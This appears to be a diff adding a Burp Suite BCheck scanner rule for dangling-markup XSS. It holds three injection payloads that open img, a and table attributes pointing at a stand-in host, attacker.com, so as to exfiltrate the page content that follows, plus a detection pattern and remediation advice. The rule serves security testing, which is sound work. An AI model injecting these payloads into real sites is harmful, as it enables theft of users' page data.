@@ -1,0 +1,22 @@
+metadata:
+    language: v2-beta
+    name: "XSS - Dangling Markup Injection"
+    description: "Tests for dangling markup injection that can exfiltrate page content"
+    author: "BCheck Arsenal"
+    tags: "xss", "dangling-markup"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "><img src='https://attacker.com/collect?"
+            - "' ><a href='https://attacker.com/collect?"
+            - "\"><table background='https://attacker.com/collect?"
+
+    if {check.response} matches "(src='https://attacker|href='https://attacker|background='https://attacker)" then
+        report issue:
+            severity: medium
+            confidence: tentative
+            detail: "Dangling markup injection detected. Injected unclosed attributes can capture subsequent page content."
+            remediation: "Encode all user-controlled output. Use CSP to restrict resource loading origins."
+    end if
